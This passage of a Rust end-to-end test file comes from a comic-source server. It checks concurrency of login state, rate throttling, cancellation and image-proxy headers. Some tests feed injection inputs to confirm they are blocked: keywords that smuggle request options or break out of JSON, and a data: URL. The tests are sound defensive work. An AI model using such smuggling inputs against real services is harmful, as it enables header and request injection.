            "login_info": { "username": "alice_v1", "apiToken": "••••••••" },
            "action": "source.getLoginInfoMap().apiToken"
        })),
    )
    .await;
    assert_eq!(st_chk1, StatusCode::OK);
    let chk1_json: serde_json::Value = serde_json::from_slice(&b_chk1).unwrap();
    assert_eq!(chk1_json["result"], "t1_fresh");

    // Subcase B: online/detail (sets cookie without changing variable/login_info) vs concurrent login-action
    let app_b = h.app.clone();
    let tok_b = h.member_token.clone();
    let sid_b = sid.clone();
    let base_b = base.clone();
    let detail_task = tokio::spawn(async move {
        json_request(
            &app_b,
            "POST",
            "/api/v1/comic/online/detail",
            &tok_b,
            Some(
                serde_json::json!({ "source_id": sid_b, "comic_url": format!("{base_b}/detail") }),
            ),
        )
        .await
    });

    detail_entered.notified().await;
    let (st_l2, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{sid}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": { "username": "alice_v2", "apiToken": "t2_fresh" },
            "action": "source.setVariable('v2_fresh');'ok'"
        })),
    )
    .await;
    assert_eq!(st_l2, StatusCode::OK);
    detail_release.notify_one();

    let (st_det, _) = detail_task.await.unwrap();
    assert_eq!(st_det, StatusCode::OK);

    let (st_v2, b_v2) = json_request(
        &h.app,
        "GET",
        &format!("/api/v1/comic/sources/{sid}/variable"),
        &h.admin_token,
        None,
    )
    .await;
    assert_eq!(st_v2, StatusCode::OK);
    let v2_json: serde_json::Value = serde_json::from_slice(&b_v2).unwrap();
    assert_eq!(v2_json["variable"], "v2_fresh");

    let (st_chk2, b_chk2) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{sid}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": { "username": "alice_v2", "apiToken": "••••••••" },
            "action": "source.getLoginInfoMap().apiToken"
        })),
    )
    .await;
    assert_eq!(st_chk2, StatusCode::OK);
    let chk2_json: serde_json::Value = serde_json::from_slice(&b_chk2).unwrap();
    assert_eq!(chk2_json["result"], "t2_fresh");
    assert!(
        chk2_json["source"]["cookie_hosts"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v.as_str() == Some("127.0.0.1")),
        "cookie set by concurrent online/detail should be preserved: {}",
        chk2_json["source"]["cookie_hosts"]
    );

    server.abort();
}

#[tokio::test]
async fn patch_and_import_upsert_concurrent_with_login_action_preserve_runtime_state_e2e() {
    let h = setup_test_harness(true).await;

    let src = serde_json::json!({
        "sourceName": "ConcurrentPatchImport",
        "sourceUrl": "https://concurrent-comic.test",
        "sourceGroup": "InitGroup",
        "weight": 1,
        "loginUi": "[{\"name\":\"user\",\"type\":\"text\"},{\"name\":\"apiToken\",\"type\":\"password\"}]",
        "loginUrl": "@js:'ok'"
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    for round in 0..20i64 {
        let var_val = format!("var_round_{round}");
        let tok_val = format!("tok_round_{round}");
        let group_patch = format!("PatchGroup_{round}");
        let group_import = format!("ImportGroup_{round}");
        let weight_target = 100 + round;

        let action_js = format!(
            "source.setVariable('{var_val}');cookie.setCookie('https://concurrent-comic.test','sid=s{round}');cache.put('k','c{round}');'ok'"
        );
        let import_payload = serde_json::json!({
            "sourceName": "ConcurrentPatchImport",
            "sourceUrl": "https://concurrent-comic.test",
            "sourceGroup": group_import,
            "weight": weight_target,
            "loginUi": "[{\"name\":\"user\",\"type\":\"text\"},{\"name\":\"apiToken\",\"type\":\"password\"}]",
            "loginUrl": "@js:'ok'"
        })
        .to_string();

        let login_uri = format!("/api/v1/comic/sources/{sid}/login-action");
        let patch_uri = format!("/api/v1/comic/sources/{sid}");

        let (res_login, res_patch) = tokio::join!(
            json_request(
                &h.app,
                "POST",
                &login_uri,
                &h.admin_token,
                Some(serde_json::json!({
                    "login_info": { "user": format!("u{round}"), "apiToken": tok_val },
                    "action": action_js
                })),
            ),
            json_request(
                &h.app,
                "PATCH",
                &patch_uri,
                &h.admin_token,
                Some(serde_json::json!({
                    "weight": weight_target,
                    "group_name": group_patch
                })),
            ),
        );
        assert_eq!(res_login.0, StatusCode::OK);
        assert_eq!(res_patch.0, StatusCode::OK);

        // Also race login-action against import upsert
        let var_val2 = format!("var_round_{round}_b");
        let tok_val2 = format!("tok_round_{round}_b");
        let action_js2 = format!(
            "source.setVariable('{var_val2}');cookie.setCookie('https://concurrent-comic.test','sid=s{round}_b');cache.put('k','c{round}_b');'ok'"
        );
        let (res_login2, res_upsert) = tokio::join!(
            json_request(
                &h.app,
                "POST",
                &login_uri,
                &h.admin_token,
                Some(serde_json::json!({
                    "login_info": { "user": format!("u{round}_b"), "apiToken": tok_val2 },
                    "action": action_js2
                })),
            ),
            json_request(
                &h.app,
                "POST",
                "/api/v1/comic/sources/import",
                &h.admin_token,
                Some(serde_json::json!({ "raw_json": import_payload })),
            ),
        );
        assert_eq!(res_login2.0, StatusCode::OK);
        assert_eq!(res_upsert.0, StatusCode::OK);

        // Verify neither login_info, variable, cookies, cache, nor metadata was lost
        let (st_chk, b_chk) = json_request(
            &h.app,
            "POST",
            &format!("/api/v1/comic/sources/{sid}/login-action"),
            &h.admin_token,
            Some(serde_json::json!({
                "login_info": { "user": format!("u{round}_b"), "apiToken": "••••••••" },
                "action": "JSON.stringify({v:source.getVariable(),t:source.getLoginInfoMap().apiToken,c:cookie.getCookie('https://concurrent-comic.test'),k:cache.get('k')})"
            })),
        )
        .await;
        assert_eq!(st_chk, StatusCode::OK);
        let chk_val: serde_json::Value = serde_json::from_slice(&b_chk).unwrap();
        let inner: serde_json::Value =
            serde_json::from_str(chk_val["result"].as_str().unwrap()).unwrap();
        assert_eq!(inner["v"], var_val2);
        assert_eq!(inner["t"], tok_val2);
        assert!(
            inner["c"]
                .as_str()
                .unwrap()
                .contains(&format!("sid=s{round}_b"))
        );
        assert_eq!(inner["k"], format!("c{round}_b"));
        assert_eq!(chk_val["source"]["weight"], weight_target);
        assert_eq!(chk_val["source"]["group_name"], group_import);
    }
}

#[tokio::test]
async fn online_search_blocks_keyword_smuggling_and_detail_preserves_same_host_cookies_e2e() {
    use axum::routing::post;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use tokio::sync::Notify;

    let smuggle_hits = Arc::new(AtomicUsize::new(0));
    let smuggle_hits_c = smuggle_hits.clone();
    let smuggle_hits_opt = smuggle_hits.clone();
    let detail_entered = Arc::new(Notify::new());
    let detail_release = Arc::new(Notify::new());
    let de = detail_entered.clone();
    let dr = detail_release.clone();

    let mock_app = Router::new()
        .route(
            "/search_plain",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"items":[{"t":"PlainOk","u":"/detail"}]}"#))
                    .unwrap()
            })
            .post(move || {
                let hits = smuggle_hits_c.clone();
                async move {
                    hits.fetch_add(1, Ordering::SeqCst);
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "application/json")
                        .body(Body::from(r#"{"items":[{"t":"Smuggled","u":"/detail"}]}"#))
                        .unwrap()
                }
            }),
        )
        .route(
            "/search_opts",
            post(move |headers: HeaderMap, body: String| {
                let hits = smuggle_hits_opt.clone();
                async move {
                    if headers.get("x-smuggled").is_some() {
                        hits.fetch_add(1, Ordering::SeqCst);
                    }
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "application/json")
                        .body(Body::from(
                            serde_json::json!({
                                "items": [{ "t": format!("Opts:{body}"), "u": "/detail" }]
                            })
                            .to_string(),
                        ))
                        .unwrap()
                }
            }),
        )
        .route(
            "/detail",
            get(move || {
                let de = de.clone();
                let dr = dr.clone();
                async move {
                    de.notify_one();
                    dr.notified().await;
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "application/json")
                        .header("set-cookie", "detail_ck=from_detail; Path=/")
                        .body(Body::from(r#"{"title":"DetailTitle"}"#))
                        .unwrap()
                }
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    let h = setup_test_harness(true).await;

    let sources = serde_json::json!([
        {
            "sourceName": "JsSearch",
            "sourceUrl": format!("{base}#js"),
            "searchUrl": format!("@js:'{base}/search_plain?q=' + key"),
            "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" }
        },
        {
            "sourceName": "MustacheArithSearch",
            "sourceUrl": format!("{base}#ma"),
            "searchUrl": format!("{base}/search_plain?offset={{{{((page - 1) * 20)}}}}&q={{{{key}}}}"),
            "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" }
        },
        {
            "sourceName": "OptsSearch",
            "sourceUrl": format!("{base}#opts"),
            "enabledCookieJar": true,
            "loginUrl": "@js:'ok'",
            "searchUrl": format!("{base}/search_opts,{{\"method\":\"POST\",\"body\":\"q={{{{key}}}}\"}}"),
            "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" },
            "ruleDetail": { "name": "$.title" }
        }
    ]);
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": sources.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let js_id = imp_val["sources"][0]["id"].as_str().unwrap().to_string();
    let ma_id = imp_val["sources"][1]["id"].as_str().unwrap().to_string();
    let opts_id = imp_val["sources"][2]["id"].as_str().unwrap().to_string();

    // 1. Member search smuggling attempts on @js: is isolated as error, while Mustache arithmetic safely percent-encodes {{key}}
    {
        let (st, b) = json_request(
            &h.app,
            "POST",
            "/api/v1/comic/online/search",
            &h.member_token,
            Some(serde_json::json!({
                "keyword": r#"a,{"method":"POST","headers":{"X-Smuggled":"YES"},"body":"evil"}"#,
                "source_ids": [&js_id],
                "page": 1
            })),
        )
        .await;
        assert_eq!(st, StatusCode::OK);
        let v: serde_json::Value = serde_json::from_slice(&b).unwrap();
        assert!(v["results"].as_array().unwrap().is_empty());
        assert_eq!(v["errors"].as_array().unwrap().len(), 1);

        let (st_ma, b_ma) = json_request(
            &h.app,
            "POST",
            "/api/v1/comic/online/search",
            &h.member_token,
            Some(serde_json::json!({
                "keyword": r#"a,{"method":"POST","headers":{"X-Smuggled":"YES"},"body":"evil"}"#,
                "source_ids": [&ma_id],
                "page": 1
            })),
        )
        .await;
        assert_eq!(st_ma, StatusCode::OK);
        let v_ma: serde_json::Value = serde_json::from_slice(&b_ma).unwrap();
        assert_eq!(v_ma["results"][0]["title"], "PlainOk");
        assert!(v_ma["errors"].as_array().unwrap().is_empty());
    }

    // 2. Member JSON breakout attempt inside ,{options} searchUrl does NOT smuggle X-Smuggled header
    let breakout_kw = r#"a","headers":{"X-Smuggled":"PWNED_HEADER"},"x":""#;
    let (st_opt, b_opt) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/search",
        &h.member_token,
        Some(serde_json::json!({
            "keyword": breakout_kw,
            "source_ids": [&opts_id],
            "page": 1
        })),
    )
    .await;
    assert_eq!(st_opt, StatusCode::OK);
    let v_opt: serde_json::Value = serde_json::from_slice(&b_opt).unwrap();
    assert_eq!(
        v_opt["results"][0]["title"],
        format!(
            "Opts:q={}",
            xmedia_source::http::url_encode_component(breakout_kw)
        )
    );

    // 3. Same-host cookie-pair granularity: slow online/detail Set-Cookie: detail_ck=from_detail
    //    must preserve concurrent login-action session=s1_fresh rotation on 127.0.0.1!
    let (st_seed_ck, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{opts_id}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": {},
            "action": format!("cookie.setCookie('{base}', 'session=s0');'ok'")
        })),
    )
    .await;
    assert_eq!(st_seed_ck, StatusCode::OK);

    let app_d = h.app.clone();
    let tok_d = h.member_token.clone();
    let oid_d = opts_id.clone();
    let base_d = base.clone();
    let detail_task = tokio::spawn(async move {
        json_request(
            &app_d,
            "POST",
            "/api/v1/comic/online/detail",
            &tok_d,
            Some(serde_json::json!({
                "source_id": oid_d,
                "comic_url": format!("{base_d}/detail")
            })),
        )
        .await
    });

    detail_entered.notified().await;
    let (st_rot, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{opts_id}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": {},
            "action": format!("cookie.setCookie('{base}', 'session=s1_fresh');'ok'")
        })),
    )
    .await;
    assert_eq!(st_rot, StatusCode::OK);
    detail_release.notify_one();

    let (st_det, _) = detail_task.await.unwrap();
    assert_eq!(st_det, StatusCode::OK);

    let (st_chk, b_chk) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{opts_id}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": {},
            "action": format!("cookie.getCookie('{base}')")
        })),
    )
    .await;
    assert_eq!(st_chk, StatusCode::OK);
    let chk_val: serde_json::Value = serde_json::from_slice(&b_chk).unwrap();
    let cookies_str = chk_val["result"].as_str().unwrap();
    assert!(
        cookies_str.contains("session=s1_fresh"),
        "concurrent login-action cookie rotation was clobbered: {cookies_str}"
    );
    assert!(
        cookies_str.contains("detail_ck=from_detail"),
        "detail Set-Cookie was lost: {cookies_str}"
    );
    assert_eq!(smuggle_hits.load(Ordering::SeqCst), 0);

    server.abort();
}

#[tokio::test]
async fn online_search_enforces_source_concurrent_rate_throttling() {
    let h = setup_test_harness(true).await;

    let origin_app = Router::new().route(
        "/search",
        get(|| async {
            Response::builder()
                .status(StatusCode::OK)
                .header("content-type", "application/json")
                .body(Body::from(
                    r#"{"items":[{"title":"Throttled","url":"/c/1"}]}"#,
                ))
                .unwrap()
        }),
    );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, origin_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    let src = serde_json::json!({
        "sourceName": "ThrottledComic",
        "sourceUrl": base,
        "concurrentRate": "1/350",
        "searchUrl": format!("{base}/search?q={{{{key}}}}"),
        "ruleSearch": {
            "bookList": "$.items[*]",
            "name": "$.title",
            "bookUrl": "@js:'https://example.test/c/1'"
        }
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    let t0 = std::time::Instant::now();
    let (st1, b1) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/search",
        &h.member_token,
        Some(serde_json::json!({ "keyword": "a", "source_ids": [sid] })),
    )
    .await;
    let (st2, b2) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/search",
        &h.member_token,
        Some(serde_json::json!({ "keyword": "b", "source_ids": [sid] })),
    )
    .await;
    let elapsed = t0.elapsed();

    assert_eq!(st1, StatusCode::OK);
    assert_eq!(st2, StatusCode::OK);
    let v1: serde_json::Value = serde_json::from_slice(&b1).unwrap();
    let v2: serde_json::Value = serde_json::from_slice(&b2).unwrap();
    assert_eq!(v1["results"].as_array().unwrap().len(), 1);
    assert_eq!(v2["results"].as_array().unwrap().len(), 1);
    assert!(
        elapsed >= std::time::Duration::from_millis(300),
        "expected concurrentRate 1/350 throttling, elapsed={elapsed:?}"
    );

    server.abort();
}

#[tokio::test]
async fn caller_supplied_comic_urls_reject_legado_options_and_data_urls_with_400() {
    let h = setup_test_harness(true).await;
    let src_json = serde_json::json!([{
        "bookSourceName": "GuardComicSource",
        "bookSourceUrl": "https://comic-guard.example",
        "searchUrl": "/search?q={{key}}",
        "ruleSearch": { "bookList": "$.items", "name": "$.name", "bookUrl": "$.url" }
    }]);
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src_json.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    for bad_url in [
        "https://comic-guard.example/c/1,{\"method\":\"POST\",\"headers\":{\"X-Evil\":\"1\"}}",
        "data:text/html,<h1>evil</h1>",
    ] {
        for (uri, payload) in [
            (
                "/api/v1/comic/online/detail",
                serde_json::json!({ "source_id": sid, "comic_url": bad_url }),
            ),
            (
                "/api/v1/comic/online/chapters",
                serde_json::json!({ "source_id": sid, "toc_url": bad_url }),
            ),
            (
                "/api/v1/comic/online/pages",
                serde_json::json!({ "source_id": sid, "chapter_url": bad_url }),
            ),
        ] {
            let (st, _) = json_request(&h.app, "POST", uri, &h.member_token, Some(payload)).await;
            assert_eq!(
                st,
                StatusCode::BAD_REQUEST,
                "expected 400 on {uri} for {bad_url}"
            );
        }
    }
}

#[tokio::test]
async fn comic_online_search_enforces_cancel_on_future_drop() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::time::Duration;

    let step1_entered = Arc::new(tokio::sync::Notify::new());
    let step1_entered_c = step1_entered.clone();
    let step2_hits = Arc::new(AtomicUsize::new(0));
    let step2_hits_c = step2_hits.clone();

    let origin_app = Router::new()
        .route(
            "/step1",
            get(move || {
                let notify = step1_entered_c.clone();
                async move {
                    notify.notify_waiters();
                    tokio::time::sleep(Duration::from_millis(220)).await;
                    r#"{"items":[{"name":"Comic","url":"/c/1"}]}"#
                }
            }),
        )
        .route(
            "/step2",
            get(move || {
                let hits = step2_hits_c.clone();
                async move {
                    hits.fetch_add(1, Ordering::SeqCst);
                    r#"{"ok":true}"#
                }
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let base = format!("http://{addr}");
    let srv = tokio::spawn(async move {
        axum::serve(listener, origin_app).await.unwrap();
    });

    let h = setup_test_harness(true).await;
    let src_json = serde_json::json!([{
        "bookSourceName": "DropComicSearchSource",
        "bookSourceUrl": base,
        "searchUrl": format!("{base}/step1?q={{{{key}}}}"),
        "ruleSearch": {
            "bookList": "$.items[*]",
            "name": "@js:java.ajax(baseUrl.replace('/step1', '/step2')); 'Comic'",
            "bookUrl": "$.url"
        }
    }]);
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src_json.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    {
        let search_fut = json_request(
            &h.app,
            "POST",
            "/api/v1/comic/online/search",
            &h.member_token,
            Some(serde_json::json!({ "keyword": "drop", "source_ids": [sid] })),
        );
        tokio::pin!(search_fut);
        tokio::select! {
            _ = &mut search_fut => panic!("comic search completed before drop"),
            _ = step1_entered.notified() => {}
        }
    }

    tokio::time::sleep(Duration::from_millis(320)).await;
    assert_eq!(
        step2_hits.load(Ordering::SeqCst),
        0,
        "CancelTasksOnDrop must abort comic search tasks before step 2 java.ajax"
    );

    srv.abort();
}

#[tokio::test]
async fn comic_image_proxy_strips_static_range_from_source_headers() {
    let seen_range: Arc<std::sync::Mutex<Vec<Option<String>>>> =
        Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_referer: Arc<std::sync::Mutex<Vec<Option<String>>>> =
        Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_range_c = seen_range.clone();
    let seen_referer_c = seen_referer.clone();

    let png = valid_png_bytes();
    let origin_app = Router::new().route(
        "/page1.png",
        get(move |headers: HeaderMap| {
            let ranges = seen_range_c.clone();
            let refs = seen_referer_c.clone();
            let bytes = png.clone();
            async move {
                let rng = headers
                    .get(header::RANGE)
                    .and_then(|v| v.to_str().ok())
                    .map(ToString::to_string);
                let ref_val = headers
                    .get(header::REFERER)
                    .and_then(|v| v.to_str().ok())
                    .map(ToString::to_string);
                ranges.lock().unwrap().push(rng.clone());
                refs.lock().unwrap().push(ref_val);
                if rng.is_some() {
                    return Response::builder()
                        .status(StatusCode::PARTIAL_CONTENT)
                        .header("content-type", "image/png")
                        .body(Body::from(bytes[..10].to_vec()))
                        .unwrap();
                }
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "image/png")
                    .body(Body::from(bytes))
                    .unwrap()
            }
        }),
    );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let base = format!("http://{addr}");
    let srv = tokio::spawn(async move {
        axum::serve(listener, origin_app).await.unwrap();
    });

    let h = setup_test_harness(true).await;
    let src_json = serde_json::json!([{
        "bookSourceName": "StaticRangeComicSource",
        "bookSourceUrl": base,
        "header": r#"{"range":"bytes=0-5"}"#,
        "imageHeader": r#"{"Range":"bytes=0-10","Referer":"https://ok.example/"}"#
    }]);
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src_json.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap();

    let encoded_url =
        form_urlencoded::byte_serialize(format!("{base}/page1.png").as_bytes()).collect::<String>();
    let req = Request::builder()
        .method("GET")
        .uri(format!(
            "/api/v1/comic/online/image-proxy?source_id={sid}&url={encoded_url}"
        ))
        .header("Authorization", format!("Bearer {}", h.member_token))
        .body(Body::empty())
        .unwrap();
    let resp = h.app.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = to_bytes(resp.into_body(), 1024 * 1024).await.unwrap();
    assert_eq!(body.as_ref(), valid_png_bytes().as_slice());
    assert_eq!(*seen_range.lock().unwrap(), vec![None]);
    assert_eq!(
        *seen_referer.lock().unwrap(),
        vec![Some("https://ok.example/".to_string())]
    );

    srv.abort();
}
